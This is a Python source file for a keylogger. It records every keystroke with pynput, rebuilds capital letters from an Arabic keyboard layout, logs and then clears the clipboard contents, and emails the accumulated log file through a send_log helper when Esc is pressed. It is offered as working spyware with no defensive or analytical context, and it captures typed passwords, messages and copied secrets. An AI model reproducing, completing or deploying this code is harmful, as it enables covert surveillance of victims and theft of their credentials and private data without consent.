import threading
import time
import pynput.keyboard
from pynput.keyboard import Key ,Controller,Listener
from emailing import send_log
import subprocess as process
import pyperclip
import os
#defining globals :
writer=open('key_logging.txt','a')
text:'list'=[]
counter=0
capitals={ 'ِ': 'A',
    '<16842485>': 'B',
    '}': 'C',
    ']': 'D',
    'ُ': 'E',
    '[': 'F',
    '<16842487>': 'G',
     'أ' :'H',
    '÷': 'I',
    '_': 'J',
    "،": 'K',
     '/' :'L' ,
    '""': 'M',
      'آ': 'N',
    '×':'O' ,
    '؛':'P' ,
     'َ':'Q',
    'ٌ': 'R',
    'ٍ': 'S',
    '<16842489>': 'T',
    '`': 'U',
    '{': 'V',
    'ً' :'W',
    'ْ':'X',
    'إ':'Y',
'~':'Z'
}
def clip_board_capture()->'None':
    global writer
    while True:
        process.run('./clipnotify',shell=True)
        captured:'str'=pyperclip.paste()
        if len(captured)!=0:
            writer.write(f"\n{"captured from clipboard".center(50,"*")}\n{captured}\n{'*'*50}")
            writer.flush()
            pyperclip.copy('')
        if threading.active_count()==1:
            writer.close()
            raise SystemExit()
class KeyLogger:
    """
    This class provides a template for creating key_logger object
    just create the object , and the keylogger listener will be started automatically
    """
    def __init__(self):
        pass
    def on_press(key:'object') ->'None':
        global text,counter
        if key==Key.backspace:
            text.append('\b')
        elif key==Key.space:
            text.append(' ')
        elif key==Key.enter:
            text.append('\n')
        elif key==Key.tab:
            text.append('\t')
        elif key!=Key.esc:
            read_character:'str'=str(key).replace("'","")
            text.append(read_character)
    def on_release(key:'object')->'None':
        """
        This call back is invoked from the thread
        when the key is released (just right after you hit the keyboard key)

        It creates the text that will be wrote to the keylogger file ,every x keystrokes(can be specified down)
        It handles perfectly capslocks (because pynput module has this restriciton :it cant record capital letters when caps lock is toggled)
        It also handles backspaces ,so , if the logged keystrokes where to be removed (by a backspace ) ,this will be reflected in the log file ,
        However , for this functionality to work fine , you need to increase the threshold of key strokes logs per time
        """
        global counter,text,writer,exit_clipboard_captue
        composed:'str'=""
        counter+=1 # the global counter
        shifted:'bool'=False
        caps_locked:'bool'=False
        if counter==100:
                for char in text:
                    if  char.startswith('Key'):
                        if char=='Key.caps_lock':
                            caps_locked=not caps_locked
                        continue
                    if char =='\x08':
                        composed=composed[0:-1]
                    elif char in capitals:
                        composed+=capitals[char]
                    else:
                        if char =='\n':
                            composed=f'{composed}\n'
                        elif caps_locked:
                            composed += (char.upper())
                        else:
                            composed+=char
                writer.write(composed)
                writer.flush() #instead of closing the buffer , we just forecfully flush its contents (the buffer pointer is still pointing to the same buffer)
                counter=0   #resetting the counter, so that we will start counting to the next chunk of logging
                text=[]  #also resetting .
        elif key==Key.esc:
            # sending the captured log by email
            send_log(path='key_logging.txt')
            #closing and exiting
            raise pynput.keyboard.Listener.StopException #exiting the listener thread if an exception is raised in the callback
    #static data fields for the keylogger object
    key_logger = Listener(on_press=on_press, on_release=on_release)
    key_logger.start()
def main():
    logger=KeyLogger()
    #capturing the contents of the clipboard
    clip_borad_thread=threading.Thread(target=clip_board_capture())
    clip_borad_thread.start()
    clip_borad_thread.join()
if __name__=="__main__":
    main()
